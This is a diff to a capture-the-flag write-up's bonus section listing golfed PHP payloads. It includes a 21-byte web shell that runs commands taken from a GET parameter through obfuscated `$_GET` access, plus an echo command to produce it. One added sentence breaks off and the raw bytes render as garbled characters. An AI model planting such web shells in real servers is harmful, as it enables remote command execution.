@@ -135,11 +135,12 @@ Even more tricky here using only 33 characters... It calls for shell via `` `...
 
 
 ## Bonus
-After the competition me and @Kittehs golfed a little and managed to get much shorter payloads!
+After the competition me and @Jelle.V.D golfed a little and managed to get much shorter payloads!
 
-- 21 bytes (full shell via `?_=rgrep /var/www MeePwn`)
+- 21 bytes (full shell via `?_=rgrep /var/www MeePwn`) where `\xa0\xb8\xba\xab` is to be converted to 
 ```php
-<?=`{${~"\xa0\xb8\xba\xab"}[_]}`;
+<?=`{${~"����"}[_]}`;
+// echo -ne '<?=`{${~"\xa0\xb8\xba\xab"}[_]}`;'
 ```
 - 19 bytes (`cat` all files from `../`)
 ```php
